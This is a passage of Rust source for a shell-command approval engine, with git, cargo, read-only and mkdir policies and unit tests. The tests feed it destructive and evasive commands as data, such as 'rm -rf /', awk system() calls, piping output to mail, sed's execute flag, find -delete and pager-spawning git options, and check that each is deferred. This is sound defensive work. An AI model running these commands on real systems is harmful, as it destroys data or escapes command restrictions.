    let (sub, args) = git_parts(seg)?;
    if sub != "restore" {
        return None;
    }
    if args.iter().any(|t| t == "--staged" || t == "-S") {
        Some(Verdict::Approve)
    } else {
        None
    }
}

/// `git tag` — create/list/delete tags. Local until pushed.
pub static GIT_TAG: Policy = Policy {
    name: "git:tag",
    verify: git_match_tag,
};

/// `git push` — network write. `--receive-pack`/`--exec` name a program to
/// run and are not covered.
pub static GIT_PUSH: Policy = Policy {
    name: "git:push",
    verify: git_match_push,
};

/// `git pull` — network sync (fetch + merge). `--upload-pack` names a
/// program to run and is not covered.
pub static GIT_PULL: Policy = Policy {
    name: "git:pull",
    verify: git_match_pull,
};

/// `git fetch` — network sync (fetch only). `--upload-pack` names a
/// program to run and is not covered.
pub static GIT_FETCH: Policy = Policy {
    name: "git:fetch",
    verify: git_match_fetch,
};

fn git_match(seg: &Segment, sub: &str, exec_flags: &[&str]) -> Option<Verdict> {
    let (found, args) = git_parts(seg)?;
    if found != sub
        || args
            .iter()
            .any(|t| exec_flags.iter().any(|f| long_is(t, f)))
    {
        return None;
    }
    Some(Verdict::Approve)
}

fn git_match_add(seg: &Segment, _p: Option<&Path>) -> Option<Verdict> {
    git_match(seg, "add", &[])
}
fn git_match_tag(seg: &Segment, _p: Option<&Path>) -> Option<Verdict> {
    git_match(seg, "tag", &[])
}
fn git_match_push(seg: &Segment, _p: Option<&Path>) -> Option<Verdict> {
    git_match(seg, "push", &["receive-pack", "exec"])
}
fn git_match_pull(seg: &Segment, _p: Option<&Path>) -> Option<Verdict> {
    git_match(seg, "pull", &["upload-pack"])
}
fn git_match_fetch(seg: &Segment, _p: Option<&Path>) -> Option<Verdict> {
    git_match(seg, "fetch", &["upload-pack"])
}

/// Split a git invocation into its subcommand and the arguments after it.
///
/// Only global options known to be inert are accepted before the
/// subcommand: `-C DIR`, pager and pathspec switches, and `-c` for display
/// keys (`color.*`, `core.quotepath`). Any other `-c key=value` can name a
/// program to run (`core.pager`, `diff.external`, `alias.*`, …), so it —
/// like every unknown global option and every run-time word — makes the
/// git policies abstain.
fn git_parts(seg: &Segment) -> Option<(&str, &[String])> {
    if seg.argv.is_empty() || seg.has_dynamic() || argv0_name(&seg.argv[0]) != "git" {
        return None;
    }
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() {
        let t = argv[i].as_str();
        match t {
            "-C" => i += 2,
            "-c" => {
                let key = argv.get(i + 1)?.split('=').next()?.to_ascii_lowercase();
                if !(key.starts_with("color.") || key == "core.quotepath") {
                    return None;
                }
                i += 2;
            }
            "--no-pager"
            | "-P"
            | "-p"
            | "--paginate"
            | "--no-optional-locks"
            | "--literal-pathspecs"
            | "--glob-pathspecs"
            | "--noglob-pathspecs"
            | "--icase-pathspecs"
            | "--no-replace-objects"
            | "--no-lazy-fetch" => i += 1,
            _ if t.starts_with('-') => return None,
            _ => return Some((t, &argv[i + 1..])),
        }
    }
    None
}

// ─── cargo:* family ─────────────────────────────────────────────────────────

const CARGO_LOCAL_SUBCOMMANDS: &[&str] = &[
    "check",
    "build",
    "b",
    "c",
    "doc",
    "d",
    "rustdoc",
    "tree",
    "metadata",
    "search",
    "read-manifest",
    "locate-project",
    "pkgid",
    "verify-project",
    "fetch",
    "help",
    "version",
    "test",
    "t",
    "bench",
    "update",
    "run",
    "r",
    "fmt",
    "clippy",
    "clean",
];

/// All cargo operations that don't reach a registry mutably. Bundles
/// build/test/run/fmt/clippy/check/doc/etc. — local actions only. Does
/// **not** subsume `crates-install` or `crates-publish`.
pub static CARGO_LOCAL: Policy = Policy {
    name: "cargo:local",
    verify: cargo_local_verify,
};

fn cargo_local_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    let sub = cargo_subcommand(seg)?;
    if !CARGO_LOCAL_SUBCOMMANDS.contains(&sub) {
        return None;
    }
    if seg.argv.iter().any(|t| t == "--fix") {
        return None;
    }
    Some(Verdict::Approve)
}

/// `cargo install` — downloads, compiles, installs from crates.io.
pub static CARGO_CRATES_INSTALL: Policy = Policy {
    name: "cargo:crates-install",
    verify: cargo_crates_install_verify,
};

fn cargo_crates_install_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    if cargo_subcommand(seg)? == "install" {
        Some(Verdict::Approve)
    } else {
        None
    }
}

/// `cargo publish` — uploads to crates.io.
pub static CARGO_CRATES_PUBLISH: Policy = Policy {
    name: "cargo:crates-publish",
    verify: cargo_crates_publish_verify,
};

fn cargo_crates_publish_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
    if cargo_subcommand(seg)? == "publish" {
        Some(Verdict::Approve)
    } else {
        None
    }
}

fn cargo_subcommand(seg: &Segment) -> Option<&str> {
    if seg.argv.is_empty() || seg.has_dynamic() || argv0_name(&seg.argv[0]) != "cargo" {
        return None;
    }
    let mut i = 1;
    while i < seg.argv.len() {
        let t = &seg.argv[i];
        if t.starts_with('+') {
            i += 1;
            continue;
        }
        if matches!(t.as_str(), "--color" | "--config" | "-Z" | "-C") {
            i += 2;
            continue;
        }
        if t.starts_with('-') {
            i += 1;
            continue;
        }
        return Some(t.as_str());
    }
    None
}

// ─── tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::{Decision, classify_stack};
    use crate::policy::SegmentPolicy;

    fn classify(cmd: &str, path: Option<&Path>, pol: &[&Policy]) -> Decision {
        let stack: Vec<&dyn SegmentPolicy> = pol.iter().map(|p| *p as &dyn SegmentPolicy).collect();
        classify_stack(cmd, path, &stack).0
    }

    fn approves(cmd: &str, pol: &[&Policy]) -> bool {
        matches!(classify(cmd, None, pol), Decision::Approve { .. })
    }
    fn defers(cmd: &str, pol: &[&Policy]) -> bool {
        matches!(classify(cmd, None, pol), Decision::Defer)
    }

    // ── read-only ────────────────────────────────────────────────────────

    #[test]
    fn read_only_basics() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("ls -la", p));
        assert!(approves("grep foo bar.txt", p));
        assert!(approves("cat README.md", p));
        assert!(approves("jq '.name' package.json", p));
        assert!(approves("ps aux", p));
    }

    #[test]
    fn read_only_rejects_unknown() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("rm -rf /", p));
        assert!(defers("curl https://example.com", p));
        assert!(defers("python script.py", p));
    }

    #[test]
    fn read_only_sed_in_place_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("sed -i 's/a/b/' f.txt", p));
        assert!(defers("sed -i.bak 's/a/b/' f.txt", p));
        assert!(defers("sed -i'' 's/a/b/' f.txt", p));
        assert!(defers("sed --in-place 's/a/b/' f.txt", p));
    }

    #[test]
    fn read_only_sed_exec_flag_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("sed 's/a/b/e' f.txt", p));
        assert!(defers("sed 's/a/b/ge' f.txt", p));
        assert!(defers("sed 's|a|b|e' f.txt", p));
    }

    #[test]
    fn read_only_sed_safe() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("sed 's/a/b/' f.txt", p));
        assert!(approves("sed 's/a/b/g' f.txt", p));
        assert!(approves("sed -n 's/a/b/p' f.txt", p));
    }

    #[test]
    fn read_only_awk_system_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("awk 'BEGIN{system(\"rm -rf /\")}'", p));
        assert!(defers("awk '{system(\"id\")}'", p));
    }

    #[test]
    fn read_only_awk_file_write_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("awk '{print > \"out.txt\"}'", p));
        assert!(defers("awk '{print >> \"out.txt\"}'", p));
        assert!(defers("awk '{print | \"mail u@example.com\"}'", p));
    }

    #[test]
    fn read_only_awk_safe() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("awk '{print $2}' f.txt", p));
        assert!(approves("awk -F: '{print $1}' /etc/passwd", p));
    }

    #[test]
    fn read_only_sysctl_read_safe_write_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("sysctl kern.ostype", p));
        assert!(approves("sysctl -a", p));
        assert!(defers("sysctl -w net.ipv4.ip_forward=1", p));
    }

    #[test]
    fn read_only_find_safe() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("find . -name '*.rs'", p));
        assert!(approves("find . -name '*.rs' -type f", p));
    }

    #[test]
    fn read_only_find_dangerous_blocked() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(defers("find . -name '*.rs' -exec rm {} \\;", p));
        assert!(defers("find . -delete", p));
        assert!(defers("find . -execdir rm {} \\;", p));
        assert!(defers("find . -fprint results.txt", p));
    }

    #[test]
    fn read_only_pipeline() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves(
            "find . -name '*.rs' -type f | sort | uniq | wc -l",
            p
        ));
        assert!(approves("LC_ALL=C sort f.txt | uniq -c | head -20", p));
    }

    // ── macos-only ───────────────────────────────────────────────────────

    #[test]
    fn macos_only() {
        let p: &[&Policy] = &[&MACOS_ONLY];
        assert!(approves("pbpaste", p));
        assert!(approves("system_profiler SPHardwareDataType", p));
        assert!(approves("sw_vers", p));
        assert!(approves("mdfind kMDItemContentType=public.image", p));
        assert!(approves("otool -L binary", p));
        assert!(defers("ls", p));
    }

    // ── help-bypass ──────────────────────────────────────────────────────

    #[test]
    fn help_bypass_unknown_binary() {
        let p: &[&Policy] = &[&HELP_BYPASS];
        assert!(approves("terraform --help", p));
        assert!(approves("kubectl -h", p));
        assert!(approves("docker --version", p));
        assert!(approves("npm --version", p));
        assert!(approves("kubectl version", p));
        assert!(approves("cargo help", p));
    }

    #[test]
    fn help_bypass_requires_two_args() {
        let p: &[&Policy] = &[&HELP_BYPASS];
        assert!(defers("terraform plan --help", p));
        assert!(defers("docker", p));
    }

    // ── mkdir-cwd ────────────────────────────────────────────────────────

    fn approves_with_path(cmd: &str, path: &str, pol: &[&Policy]) -> bool {
        let p = Path::new(path);
        matches!(classify(cmd, Some(p), pol), Decision::Approve { .. })
    }
    fn defers_with_path(cmd: &str, path: &str, pol: &[&Policy]) -> bool {
        let p = Path::new(path);
        matches!(classify(cmd, Some(p), pol), Decision::Defer)
    }

    #[test]
    fn mkdir_relative_subdir_safe() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(approves_with_path("mkdir foo", cwd, p));
        assert!(approves_with_path("mkdir -p foo/bar", cwd, p));
        assert!(approves_with_path("mkdir -pv src/components", cwd, p));
        assert!(approves_with_path(
            "mkdir --parents deeply/nested/path",
            cwd,
            p
        ));
        assert!(approves_with_path("mkdir a b c", cwd, p));
        assert!(approves_with_path("mkdir ./foo", cwd, p));
    }

    #[test]
    fn mkdir_absolute_under_cwd_safe() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(approves_with_path("mkdir /home/user/project/foo", cwd, p));
        assert!(approves_with_path(
            "mkdir -p /home/user/project/src/components",
            cwd,
            p
        ));
    }

    #[test]
    fn mkdir_absolute_outside_cwd_blocked() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(defers_with_path("mkdir /tmp/foo", cwd, p));
        assert!(defers_with_path("mkdir -p /etc/thing", cwd, p));
        assert!(defers_with_path("mkdir -p /home/user/other/foo", cwd, p));
        assert!(defers_with_path("mkdir -p /home/user", cwd, p));
    }

    #[test]
    fn mkdir_parent_traversal_blocked() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(defers_with_path("mkdir ../foo", cwd, p));
        assert!(defers_with_path("mkdir -p foo/../../bar", cwd, p));
    }

    #[test]
    fn mkdir_traversal_back_into_cwd_safe() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(approves_with_path("mkdir -p foo/../bar", cwd, p));
    }

    #[test]
    fn mkdir_home_and_var_blocked() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(defers_with_path("mkdir ~/foo", cwd, p));
        assert!(defers_with_path("mkdir $HOME/foo", cwd, p));
    }

    #[test]
    fn mkdir_mode_flag_consumes_arg() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(approves_with_path("mkdir -m 755 foo", cwd, p));
        assert!(approves_with_path("mkdir --mode 0750 foo", cwd, p));
        assert!(approves_with_path("mkdir -pm 755 foo/bar", cwd, p));
    }

    #[test]
    fn mkdir_no_paths_defers() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(defers_with_path("mkdir", cwd, p));
        assert!(defers_with_path("mkdir -p", cwd, p));
    }

    #[test]
    fn mkdir_quoted_path() {
        let p: &[&Policy] = &[&MKDIR_CWD];
        let cwd = "/home/user/project";
        assert!(approves_with_path(
            "mkdir -p \"/home/user/project/foo\"",
            cwd,
            p
        ));
        assert!(approves_with_path(
            "mkdir -p '/home/user/project/foo'",
            cwd,
            p
        ));
        assert!(defers_with_path("mkdir -p '/tmp/foo'", cwd, p));
    }

    // ── git family ───────────────────────────────────────────────────────

    #[test]
    fn git_read_safe() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(approves("git status", p));
        assert!(approves("git log --oneline -10", p));
        assert!(approves("git diff --stat", p));
        assert!(approves("git show HEAD", p));
        assert!(approves("git branch", p));
        assert!(approves("git blame foo.rs", p));
        assert!(approves("git rev-parse HEAD", p));
    }

    #[test]
    fn git_grep_cat_file_merge_base_read_but_pager_opt_asks() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(approves("git grep -n foo src", p));
        assert!(approves("git cat-file -p abc123", p));
        assert!(approves("git merge-base main HEAD", p));
        assert!(defers("git grep -Osh foo", p));
        assert!(defers("git grep -nO foo", p));
        assert!(defers("git grep --open-files-in-pager=sh foo", p));
        assert!(defers("git grep --open foo", p));
        assert!(defers("git grep --o foo", p));
        assert!(defers("git cat-file --textconv HEAD:a", p));
        assert!(defers("git cat-file --filters HEAD:a", p));
        assert!(defers("git cat-file --text HEAD:a", p));
    }

    #[test]
    fn git_global_flags_skipped() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(approves("git -C /tmp status", p));
        assert!(approves("git -c color.ui=always log", p));
    }

    #[test]
    fn git_branch_dangerous_flags_blocked_under_read() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(defers("git branch -D feature", p));
        assert!(defers("git branch -d feature", p));
        assert!(defers("git branch -m old new", p));
        assert!(defers("git branch --force feature main", p));
    }

    #[test]
    fn git_config_get_safe_write_blocked() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(approves("git config --get user.name", p));
        assert!(defers("git config --global user.name x", p));
        assert!(defers("git config --unset user.name", p));
    }

    #[test]
    fn git_add_only_with_add() {
        let p: &[&Policy] = &[&GIT_ADD];
        assert!(approves("git add Cargo.toml", p));
        assert!(approves("git add .", p));
        assert!(defers("git status", p));
    }

    #[test]
    fn git_commit_safe_vs_dangerous() {
        let p: &[&Policy] = &[&GIT_COMMIT];
        assert!(approves("git commit -m wip", p));
        assert!(defers("git commit --amend", p));
        assert!(defers("git commit --no-verify -m x", p));
        assert!(defers("git commit --no-gpg-sign -m x", p));
    }

    #[test]
    fn git_restore_staged_only_with_flag() {
        let p: &[&Policy] = &[&GIT_RESTORE_STAGED];
        assert!(approves("git restore --staged foo.txt", p));
        assert!(approves("git restore -S foo.txt", p));
        assert!(defers("git restore foo.txt", p));
    }

    #[test]
    fn git_tag_approves() {
        let p: &[&Policy] = &[&GIT_TAG];
        assert!(approves("git tag v1.0", p));
        assert!(approves("git tag -l", p));
        assert!(approves("git tag -d old", p));
    }

    #[test]
    fn git_network_each_separate() {
        assert!(approves("git fetch", &[&GIT_FETCH]));
        assert!(approves("git pull", &[&GIT_PULL]));
        assert!(approves("git push", &[&GIT_PUSH]));
        // No subsumption: git-fetch alone doesn't approve push.
        assert!(defers("git push", &[&GIT_FETCH]));
    }

    #[test]
    fn git_destructive_never_approves() {
        let p: &[&Policy] = &[
            &GIT_READ,
            &GIT_ADD,
            &GIT_COMMIT,
            &GIT_RESTORE_STAGED,
            &GIT_TAG,
            &GIT_FETCH,
            &GIT_PULL,
            &GIT_PUSH,
        ];
        assert!(defers("git reset --hard HEAD", p));
        assert!(defers("git rebase main", p));
        assert!(defers("git merge feature", p));
        assert!(defers("git checkout .", p));
        assert!(defers("git clean -fd", p));
        assert!(defers("git rm foo.txt", p));
        assert!(defers("git stash", p));
        assert!(defers("git cherry-pick abc", p));
    }

    // ── cd + git compounds ───────────────────────────────────────────────

    #[test]
    fn cd_then_git_compound() {
        let p: &[&Policy] = &[&GIT_READ];
        assert!(approves("cd /tmp && git status", p));
        let p2: &[&Policy] = &[&GIT_READ, &GIT_ADD, &GIT_COMMIT];
        assert!(approves("cd /tmp && git add . && git commit -m wip", p2));
        // push not enabled → defer
        assert!(defers("cd /tmp && git push", p2));
    }

    // ── cargo family ─────────────────────────────────────────────────────

    #[test]
    fn cargo_local_safe() {
        let p: &[&Policy] = &[&CARGO_LOCAL];
        assert!(approves("cargo check", p));
        assert!(approves("cargo build --release", p));
        assert!(approves("cargo test", p));
        assert!(approves("cargo doc -p tracing-subscriber --no-deps", p));
        assert!(approves("cargo tree -i serde", p));
        assert!(approves("cargo metadata --format-version 1", p));
        assert!(approves("cargo run", p));
        assert!(approves("cargo fmt", p));
        assert!(approves("cargo clippy", p));
        assert!(approves("cargo update", p));
        assert!(approves("cargo update -p some-dep", p));
        assert!(approves(
            "cargo update --manifest-path tools/x/Cargo.toml -p some-dep",
            p,
        ));
        assert!(approves("cargo clean", p));
    }

    #[test]
    fn cargo_local_does_not_subsume_install_publish() {
        let p: &[&Policy] = &[&CARGO_LOCAL];
        assert!(defers("cargo install some-dep", p));
        assert!(defers("cargo publish", p));
    }

    #[test]
    fn cargo_install_explicit() {
        let p: &[&Policy] = &[&CARGO_CRATES_INSTALL];
        assert!(approves("cargo install dabin", p));
        assert!(defers("cargo build", p));
    }

    #[test]
    fn cargo_publish_explicit() {
        let p: &[&Policy] = &[&CARGO_CRATES_PUBLISH];
        assert!(approves("cargo publish", p));
        assert!(defers("cargo install dabin", p));
    }

    #[test]
    fn cargo_toolchain_override_skipped() {
        let p: &[&Policy] = &[&CARGO_LOCAL];
        assert!(approves("cargo +nightly check", p));
    }

    #[test]
    fn cargo_fix_flag_blocked() {
        let p: &[&Policy] = &[&CARGO_LOCAL];
        assert!(defers("cargo check --fix", p));
    }

    #[test]
    fn cargo_unknown_subcommand_defers() {
        let p: &[&Policy] = &[&CARGO_LOCAL];
        assert!(defers("cargo new myproj", p));
    }

    // ── help-bypass + cargo interplay ────────────────────────────────────

    #[test]
    fn help_bypass_works_alongside_cargo() {
        let p: &[&Policy] = &[&HELP_BYPASS, &CARGO_LOCAL];
        assert!(approves("cargo --help", p));
        assert!(approves("cargo build --help", p));
        assert!(approves("terraform --help", p));
    }

    #[test]
    fn printf_v_assignment_defers() {
        let p: &[&Policy] = &[&READ_ONLY];
        assert!(approves("printf '%s\\n' hi", p));
        assert!(defers("printf -v PATH /x", p));
        assert!(defers("printf -vPATH /x", p));
        assert!(defers("printf -v TMPDIR /etc", p));
        assert!(approves("printf -- -v x", p));
        assert!(defers("printf $F x", p));
        assert!(defers("printf -v PATH /x; ls", p));
    }
}
